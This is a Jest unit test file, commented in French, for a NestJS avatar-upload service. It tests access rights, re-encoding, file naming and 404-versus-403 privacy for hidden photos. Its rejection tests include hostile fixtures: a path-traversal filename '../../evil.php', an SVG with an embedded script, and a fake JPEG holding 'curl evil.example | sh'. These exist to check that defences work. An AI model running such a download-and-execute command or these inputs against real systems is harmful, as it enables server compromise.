import { Test, TestingModule } from '@nestjs/testing';
import { getRepositoryToken } from '@nestjs/typeorm';
import {
  BadRequestException,
  ForbiddenException,
  InternalServerErrorException,
  NotFoundException,
  PayloadTooLargeException,
} from '@nestjs/common';
// `import * as` imposé par `export = sharp` + `esModuleInterop: false`.
import * as sharp from 'sharp';
import { AvatarService, buildAvatarObjectKey } from '../../../src/profiles/avatar.service';
import { AdministrativeProfile } from '../../../src/profiles/entities/administrative-profile.entity';
import { FieldVisibilityService } from '../../../src/profiles/field-visibility.service';
import { ProfilesService } from '../../../src/profiles/profiles.service';
import { toAdministrativeProfileView } from '../../../src/profiles/administrative-profile.view';
import { EventsService } from '../../../src/events/events.service';
import { ImageTranscoder } from '../../../src/media/image-transcoder';
import { MediaConfig } from '../../../src/media/media.config';
import { MEDIA_STORAGE_PORT } from '../../../src/media/media-storage.port';
import { UserRole } from '../../../src/common/enums/user-role.enum';
import { Actor } from '../../../src/common/types/actor.type';

const STUDENT_ID = '11111111-1111-4111-8111-111111111111';
const TEACHER_ID = '22222222-2222-4222-8222-222222222222';
const PARENT_ID = '33333333-3333-4333-8333-333333333333';
const RP_ID = '44444444-4444-4444-8444-444444444444';

const makeActor = (role: UserRole, id = 'actor-uuid'): Actor => ({ id, role });

/**
 * Photo de profil : droits, filtrage, remplacement, suppression.
 *
 * Le point le plus important couvert ici : la LECTURE d'une photo masquée
 * renvoie 404 et non 403. Un 403 dirait « il y a bien une photo, mais elle ne
 * vous est pas destinée » — exactement l'information que le titulaire a choisi
 * de ne pas partager.
 */
describe('AvatarService', () => {
  let service: AvatarService;
  let adminRepo: any;
  let mediaStorage: any;
  let imageTranscoder: any;
  let profilesService: any;
  let fieldVisibilityService: any;
  let eventsService: any;
  const mediaConfig = { storagePath: '/tmp/media', maxUploadBytes: 1024 * 1024 } as MediaConfig;

  /** Image PNG réelle, assez petite pour rester rapide à encoder. */
  let realPngBytes: Buffer;

  const makeProfile = (overrides: Partial<AdministrativeProfile> = {}): AdministrativeProfile =>
    ({
      userId: STUDENT_ID,
      firstName: 'Alice',
      lastName: 'Martin',
      avatarObjectKey: null,
      avatarContentType: null,
      avatarUpdatedAt: null,
      createdAt: new Date('2026-01-01T00:00:00Z'),
      updatedAt: new Date('2026-01-01T00:00:00Z'),
      ...overrides,
    }) as AdministrativeProfile;

  const uploadedFile = (bytes: Buffer, originalname = 'photo.png', mimetype = 'image/png') => ({
    buffer: bytes,
    size: bytes.length,
    originalname,
    mimetype,
  });

  beforeAll(async () => {
    realPngBytes = await sharp({
      create: { width: 120, height: 120, channels: 3, background: { r: 10, g: 20, b: 30 } },
    })
      .png()
      .toBuffer();
  });

  beforeEach(async () => {
    adminRepo = {
      findOne: jest.fn().mockResolvedValue(makeProfile()),
      save: jest.fn().mockImplementation(async (profile) => profile),
    };
    mediaStorage = {
      save: jest.fn().mockResolvedValue(undefined),
      read: jest.fn().mockResolvedValue(Buffer.from('octets-webp')),
      delete: jest.fn().mockResolvedValue(undefined),
    };
    // Le vrai transcodeur : ce sont ses garanties (format, EXIF, taille) qui
    // font l'intérêt de la route ; le remplacer par un stub testerait le stub.
    imageTranscoder = new ImageTranscoder();
    fieldVisibilityService = { resolveAudience: jest.fn().mockResolvedValue('linked') };
    eventsService = { publish: jest.fn() };
    profilesService = {
      assertReadAccess: jest.fn().mockResolvedValue(undefined),
      resolveViewerRelation: jest.fn().mockResolvedValue('owner'),
      presentAdministrativeProfile: jest
        .fn()
        .mockImplementation((profile) => toAdministrativeProfileView(profile)),
    };

    const module: TestingModule = await Test.createTestingModule({
      providers: [
        AvatarService,
        { provide: getRepositoryToken(AdministrativeProfile), useValue: adminRepo },
        { provide: MEDIA_STORAGE_PORT, useValue: mediaStorage },
        { provide: ImageTranscoder, useValue: imageTranscoder },
        { provide: MediaConfig, useValue: mediaConfig },
        { provide: ProfilesService, useValue: profilesService },
        { provide: FieldVisibilityService, useValue: fieldVisibilityService },
        { provide: EventsService, useValue: eventsService },
      ],
    }).compile();

    service = module.get<AvatarService>(AvatarService);
  });

  // ===========================================================================
  // ENVOI
  // ===========================================================================
  describe('uploadAvatar', () => {
    describe('cas nominal', () => {
      it('stocke les octets RÉ-ENCODÉS, jamais ceux reçus', async () => {
        await service.uploadAvatar(
          STUDENT_ID,
          uploadedFile(realPngBytes),
          makeActor(UserRole.ELEVE, STUDENT_ID),
        );

        expect(mediaStorage.save).toHaveBeenCalledTimes(1);
        const [, storedBytes] = mediaStorage.save.mock.calls[0];
        expect(storedBytes.equals(realPngBytes)).toBe(false);
        expect((await sharp(storedBytes).metadata()).format).toBe('webp');
      });

      it('génère un nom de fichier côté serveur, sans reprendre celui du client', async () => {
        await service.uploadAvatar(
          STUDENT_ID,
          uploadedFile(realPngBytes, '../../evil.php', 'image/svg+xml'),
          makeActor(UserRole.ELEVE, STUDENT_ID),
        );

        const [objectKey] = mediaStorage.save.mock.calls[0];
        expect(objectKey).toMatch(/^avatars\/[0-9a-f-]{36}\.webp$/);
        expect(objectKey).not.toContain('evil');
        expect(objectKey).not.toContain('..');
        expect(objectKey).not.toContain('php');
      });

      it('renvoie une URL versionnée, et JAMAIS un chemin de fichier', async () => {
        const result = await service.uploadAvatar(
          STUDENT_ID,
          uploadedFile(realPngBytes),
          makeActor(UserRole.ELEVE, STUDENT_ID),
        );

        expect(result.avatarUrl).toMatch(
          new RegExp(`^/api/v1/profiles/${STUDENT_ID}/avatar\\?v=\\d+$`),
        );
        expect(result.avatarUrl).not.toContain(mediaConfig.storagePath);
        expect(result.avatarUrl).not.toContain('avatars/');
        expect(Object.keys(result)).toEqual(['avatarUrl']);
      });

      it('enregistre la clé, le type MIME et l’horodatage de version en base', async () => {
        const before = Date.now();

        await service.uploadAvatar(
          STUDENT_ID,
          uploadedFile(realPngBytes),
          makeActor(UserRole.ELEVE, STUDENT_ID),
        );

        const saved = adminRepo.save.mock.calls[0][0];
        expect(saved.avatarObjectKey).toMatch(/^avatars\//);
        expect(saved.avatarContentType).toBe('image/webp');
        expect(saved.avatarUpdatedAt.getTime()).toBeGreaterThanOrEqual(before);
      });

      it('publie ProfileUpdated en nommant le champ concerné', async () => {
        await service.uploadAvatar(
          STUDENT_ID,
          uploadedFile(realPngBytes),
          makeActor(UserRole.ELEVE, STUDENT_ID),
        );

        expect(eventsService.publish).toHaveBeenCalledWith(
          'ProfileUpdated',
          expect.objectContaining({ userId: STUDENT_ID, field: 'avatarUrl' }),
        );
      });

      it('écrit le fichier AVANT la base : jamais de référence morte', async () => {
        const order: string[] = [];
        mediaStorage.save.mockImplementation(async () => void order.push('storage'));
        adminRepo.save.mockImplementation(async (profile: AdministrativeProfile) => {
          order.push('database');
          return profile;
        });

        await service.uploadAvatar(
          STUDENT_ID,
          uploadedFile(realPngBytes),
          makeActor(UserRole.ELEVE, STUDENT_ID),
        );

        expect(order).toEqual(['storage', 'database']);
      });
    });

    describe('remplacement', () => {
      it('supprime l’ancien fichier, sinon le volume enfle à chaque photo', async () => {
        const previousKey = 'avatars/99999999-9999-4999-8999-999999999999.webp';
        adminRepo.findOne.mockResolvedValue(makeProfile({ avatarObjectKey: previousKey }));

        await service.uploadAvatar(
          STUDENT_ID,
          uploadedFile(realPngBytes),
          makeActor(UserRole.ELEVE, STUDENT_ID),
        );

        expect(mediaStorage.delete).toHaveBeenCalledWith(previousKey);
      });

      it('supprime l’ancien APRÈS avoir enregistré le nouveau en base', async () => {
        const previousKey = 'avatars/99999999-9999-4999-8999-999999999999.webp';
        adminRepo.findOne.mockResolvedValue(makeProfile({ avatarObjectKey: previousKey }));

        const order: string[] = [];
        adminRepo.save.mockImplementation(async (profile: AdministrativeProfile) => {
          order.push('database');
          return profile;
        });
        mediaStorage.delete.mockImplementation(async () => void order.push('delete-previous'));

        await service.uploadAvatar(
          STUDENT_ID,
          uploadedFile(realPngBytes),
          makeActor(UserRole.ELEVE, STUDENT_ID),
        );

        expect(order).toEqual(['database', 'delete-previous']);
      });

      it('ne supprime rien quand il n’y avait pas de photo', async () => {
        await service.uploadAvatar(
          STUDENT_ID,
          uploadedFile(realPngBytes),
          makeActor(UserRole.ELEVE, STUDENT_ID),
        );

        expect(mediaStorage.delete).not.toHaveBeenCalled();
      });

      it('réussit quand même si l’ancien fichier ne peut pas être supprimé', async () => {
        adminRepo.findOne.mockResolvedValue(
          makeProfile({ avatarObjectKey: 'avatars/99999999-9999-4999-8999-999999999999.webp' }),
        );
        mediaStorage.delete.mockRejectedValue(new Error('volume en lecture seule'));

        // Un ménage raté ne doit pas transformer un envoi réussi en échec :
        // la nouvelle photo est stockée et référencée, l'anomalie est journalisée.
        const result = await service.uploadAvatar(
          STUDENT_ID,
          uploadedFile(realPngBytes),
          makeActor(UserRole.ELEVE, STUDENT_ID),
        );

        expect(result.avatarUrl).toContain('/avatar?v=');
      });
    });

    describe('droits d’écriture — le titulaire seul', () => {
      it.each([
        ['un tiers quelconque', makeActor(UserRole.ELEVE, 'autre-eleve')],
        ['le parent financeur', makeActor(UserRole.PARENT_FINANCEUR, PARENT_ID)],
        ['le responsable pédagogique', makeActor(UserRole.RESPONSABLE_PEDAGOGIQUE, RP_ID)],
        ['le technicien informatique', makeActor(UserRole.TECHNICIEN_INFORMATIQUE, 'ti-uuid')],
        ['l’administrateur financier', makeActor(UserRole.ADMINISTRATEUR_FINANCIER, 'af-uuid')],
        ['un formateur lié', makeActor(UserRole.FORMATEUR, TEACHER_ID)],
      ])('refuse en 403 %s', async (_label, actor) => {
        await expect(
          service.uploadAvatar(STUDENT_ID, uploadedFile(realPngBytes), actor),
        ).rejects.toThrow(ForbiddenException);
      });

      it('ne touche NI au stockage NI à la base quand l’appelant est refusé', async () => {
        await expect(
          service.uploadAvatar(
            STUDENT_ID,
            uploadedFile(realPngBytes),
            makeActor(UserRole.RESPONSABLE_PEDAGOGIQUE, RP_ID),
          ),
        ).rejects.toThrow(ForbiddenException);

        expect(mediaStorage.save).not.toHaveBeenCalled();
        expect(adminRepo.save).not.toHaveBeenCalled();
      });
    });

    describe('entrées refusées', () => {
      const owner = () => makeActor(UserRole.ELEVE, STUDENT_ID);

      it('refuse en 400 une requête sans fichier', async () => {
        await expect(service.uploadAvatar(STUDENT_ID, undefined, owner())).rejects.toThrow(
          BadRequestException,
        );
      });

      it('refuse en 400 un fichier vide', async () => {
        await expect(
          service.uploadAvatar(STUDENT_ID, uploadedFile(Buffer.alloc(0)), owner()),
        ).rejects.toThrow(BadRequestException);
      });

      it('refuse en 413 une image au-delà de MEDIA_MAX_UPLOAD_BYTES', async () => {
        const tooBig = Buffer.alloc(mediaConfig.maxUploadBytes + 1, 0x41);

        await expect(service.uploadAvatar(STUDENT_ID, uploadedFile(tooBig), owner())).rejects.toThrow(
          PayloadTooLargeException,
        );
        expect(mediaStorage.save).not.toHaveBeenCalled();
      });

      it('refuse en 400 un SVG, même annoncé « image/png » avec une extension .png', async () => {
        const svg = Buffer.from(
          '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><script>x()</script></svg>',
        );

        await expect(
          service.uploadAvatar(STUDENT_ID, uploadedFile(svg, 'innocent.png', 'image/png'), owner()),
        ).rejects.toThrow(BadRequestException);
        expect(mediaStorage.save).not.toHaveBeenCalled();
      });

      it('refuse en 400 un fichier qui n’est pas une image, malgré un Content-Type flatteur', async () => {
        const script = Buffer.from('#!/bin/sh\ncurl evil.example | sh\n');

        await expect(
          service.uploadAvatar(STUDENT_ID, uploadedFile(script, 'photo.jpg', 'image/jpeg'), owner()),
        ).rejects.toThrow(BadRequestException);
        expect(mediaStorage.save).not.toHaveBeenCalled();
      });

      it('remonte en 500 l’absence de profil administratif, sans le créer à la volée', async () => {
        adminRepo.findOne.mockResolvedValue(null);

        await expect(
          service.uploadAvatar(STUDENT_ID, uploadedFile(realPngBytes), owner()),
        ).rejects.toThrow(InternalServerErrorException);
        expect(adminRepo.save).not.toHaveBeenCalled();
      });
    });
  });

  // ===========================================================================
  // LECTURE
  // ===========================================================================
  describe('getAvatarBytes', () => {
    const storedProfile = () =>
      makeProfile({
        avatarObjectKey: 'avatars/55555555-5555-4555-8555-555555555555.webp',
        avatarContentType: 'image/webp',
        avatarUpdatedAt: new Date('2026-08-10T10:00:00Z'),
      });

    it('rend les octets au titulaire', async () => {
      adminRepo.findOne.mockResolvedValue(storedProfile());
      profilesService.resolveViewerRelation.mockResolvedValue('owner');

      const result = await service.getAvatarBytes(STUDENT_ID, makeActor(UserRole.ELEVE, STUDENT_ID));

      expect(result.bytes.toString()).toBe('octets-webp');
      expect(result.contentType).toBe('image/webp');
      expect(result.updatedAt).toEqual(new Date('2026-08-10T10:00:00Z'));
    });

    it('ne consulte AUCUN réglage pour un lecteur exempté (parent financeur, rôles admin)', async () => {
      adminRepo.findOne.mockResolvedValue(storedProfile());
      profilesService.resolveViewerRelation.mockResolvedValue('exempt');

      await service.getAvatarBytes(STUDENT_ID, makeActor(UserRole.PARENT_FINANCEUR, PARENT_ID));

      expect(fieldVisibilityService.resolveAudience).not.toHaveBeenCalled();
    });

    it('rend les octets au formateur lié quand la photo est au socle partagé', async () => {
      adminRepo.findOne.mockResolvedValue(storedProfile());
      profilesService.resolveViewerRelation.mockResolvedValue('linked');
      fieldVisibilityService.resolveAudience.mockResolvedValue('linked');

      const result = await service.getAvatarBytes(
        STUDENT_ID,
        makeActor(UserRole.FORMATEUR, TEACHER_ID),
      );

      expect(result.bytes).toBeInstanceOf(Buffer);
      expect(fieldVisibilityService.resolveAudience).toHaveBeenCalledWith(STUDENT_ID, 'avatarUrl');
    });

    it('renvoie 404 — et NON 403 — quand l’élève a masqué sa photo au formateur', async () => {
      adminRepo.findOne.mockResolvedValue(storedProfile());
      profilesService.resolveViewerRelation.mockResolvedValue('linked');
      fieldVisibilityService.resolveAudience.mockResolvedValue('self');

      const failure = await service
        .getAvatarBytes(STUDENT_ID, makeActor(UserRole.FORMATEUR, TEACHER_ID))
        .catch((error: Error) => error);

      expect(failure).toBeInstanceOf(NotFoundException);
      expect(failure).not.toBeInstanceOf(ForbiddenException);
      // Les octets ne sont même pas lus : rien ne doit pouvoir fuir par une
      // différence de temps de réponse ou un log d'accès.
      expect(mediaStorage.read).not.toHaveBeenCalled();
    });

    it('donne le MÊME message pour « masquée » et « pas de photo » — sinon le 404 est bavard', async () => {
      adminRepo.findOne.mockResolvedValue(storedProfile());
      profilesService.resolveViewerRelation.mockResolvedValue('linked');
      fieldVisibilityService.resolveAudience.mockResolvedValue('self');
      const hidden = await service
        .getAvatarBytes(STUDENT_ID, makeActor(UserRole.FORMATEUR, TEACHER_ID))
        .catch((error: Error) => error.message);

      adminRepo.findOne.mockResolvedValue(makeProfile({ avatarObjectKey: null }));
      const absent = await service
        .getAvatarBytes(STUDENT_ID, makeActor(UserRole.FORMATEUR, TEACHER_ID))
        .catch((error: Error) => error.message);

      expect(hidden).toBe(absent);
    });

    it('renvoie 404 quand aucune photo n’est enregistrée', async () => {
      adminRepo.findOne.mockResolvedValue(makeProfile({ avatarObjectKey: null }));

      await expect(
        service.getAvatarBytes(STUDENT_ID, makeActor(UserRole.ELEVE, STUDENT_ID)),
      ).rejects.toThrow(NotFoundException);
    });

    it('renvoie 404 quand la base référence un objet absent du stockage', async () => {
      adminRepo.findOne.mockResolvedValue(storedProfile());
      mediaStorage.read.mockResolvedValue(null);

      await expect(
        service.getAvatarBytes(STUDENT_ID, makeActor(UserRole.ELEVE, STUDENT_ID)),
      ).rejects.toThrow(NotFoundException);
    });

    it('propage le 403 du contrôle d’accès au PROFIL, distinct du masquage', async () => {
      profilesService.assertReadAccess.mockRejectedValue(new ForbiddenException('non lié'));

      await expect(
        service.getAvatarBytes(STUDENT_ID, makeActor(UserRole.FORMATEUR, 'formateur-non-lie')),
      ).rejects.toThrow(ForbiddenException);
      expect(adminRepo.findOne).not.toHaveBeenCalled();
    });

    it('emprunte les ports de ProfilesService plutôt que de refaire les règles', async () => {
      adminRepo.findOne.mockResolvedValue(storedProfile());
      const actor = makeActor(UserRole.FORMATEUR, TEACHER_ID);

      await service.getAvatarBytes(STUDENT_ID, actor);

      expect(profilesService.assertReadAccess).toHaveBeenCalledWith(STUDENT_ID, actor);
      expect(profilesService.resolveViewerRelation).toHaveBeenCalledWith(STUDENT_ID, actor);
    });
  });

  // ===========================================================================
  // SUPPRESSION
  // ===========================================================================
  describe('deleteAvatar', () => {
    const storedKey = 'avatars/66666666-6666-4666-8666-666666666666.webp';

    beforeEach(() => {
      adminRepo.findOne.mockResolvedValue(makeProfile({ avatarObjectKey: storedKey }));
    });

    it('efface la référence en base ET le fichier sur le volume', async () => {
      await service.deleteAvatar(STUDENT_ID, makeActor(UserRole.ELEVE, STUDENT_ID));

      const saved = adminRepo.save.mock.calls[0][0];
      expect(saved.avatarObjectKey).toBeNull();
      expect(saved.avatarContentType).toBeNull();
      expect(saved.avatarUpdatedAt).toBeNull();
      expect(mediaStorage.delete).toHaveBeenCalledWith(storedKey);
    });

    it('met la base à jour AVANT le fichier : jamais de référence morte', async () => {
      const order: string[] = [];
      adminRepo.save.mockImplementation(async (profile: AdministrativeProfile) => {
        order.push('database');
        return profile;
      });
      mediaStorage.delete.mockImplementation(async () => void order.push('storage'));

      await service.deleteAvatar(STUDENT_ID, makeActor(UserRole.ELEVE, STUDENT_ID));

      expect(order).toEqual(['database', 'storage']);
    });

    it('est idempotent : supprimer une photo absente réussit sans rien écrire', async () => {
      adminRepo.findOne.mockResolvedValue(makeProfile({ avatarObjectKey: null }));

      await expect(
        service.deleteAvatar(STUDENT_ID, makeActor(UserRole.ELEVE, STUDENT_ID)),
      ).resolves.toBeUndefined();
      expect(adminRepo.save).not.toHaveBeenCalled();
      expect(mediaStorage.delete).not.toHaveBeenCalled();
    });

    it.each([
      ['le parent financeur', makeActor(UserRole.PARENT_FINANCEUR, PARENT_ID)],
      ['le responsable pédagogique', makeActor(UserRole.RESPONSABLE_PEDAGOGIQUE, RP_ID)],
      ['un tiers', makeActor(UserRole.ELEVE, 'autre-eleve')],
    ])('refuse en 403 %s', async (_label, actor) => {
      await expect(service.deleteAvatar(STUDENT_ID, actor)).rejects.toThrow(ForbiddenException);
      expect(mediaStorage.delete).not.toHaveBeenCalled();
    });

    it('publie ProfileUpdated en nommant le champ concerné', async () => {
      await service.deleteAvatar(STUDENT_ID, makeActor(UserRole.ELEVE, STUDENT_ID));

      expect(eventsService.publish).toHaveBeenCalledWith(
        'ProfileUpdated',
        expect.objectContaining({ userId: STUDENT_ID, field: 'avatarUrl' }),
      );
    });
  });

  // ===========================================================================
  // Clé d'objet
  // ===========================================================================
  describe('buildAvatarObjectKey', () => {
    it('produit une clé neuve à chaque appel', () => {
      expect(buildAvatarObjectKey('webp')).not.toBe(buildAvatarObjectKey('webp'));
    });

    it('respecte la forme attendue par l’adaptateur de stockage', () => {
      expect(buildAvatarObjectKey('webp')).toMatch(/^avatars\/[0-9a-f-]{36}\.webp$/);
    });
  });
});
